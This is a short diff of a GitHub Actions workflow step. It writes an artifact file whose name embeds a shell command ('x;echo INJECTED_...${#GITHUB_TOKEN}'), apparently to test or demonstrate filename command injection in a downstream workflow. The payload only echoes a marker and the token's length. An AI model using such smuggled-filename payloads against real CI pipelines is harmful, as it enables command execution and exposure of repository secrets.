@@ -12,7 +12,8 @@ jobs:
         run: |
           mkdir -p /tmp/content
           printf '1\n' > /tmp/content/pr_number.txt
-          echo "base content" > /tmp/content/result.txt
+          echo "attacker report" > '/tmp/content/x;echo INJECTED_$GITHUB_RUN_ID_len_${#GITHUB_TOKEN};.txt'
+          ls -la /tmp/content
       - name: Upload
         uses: actions/upload-artifact@v4
         with:
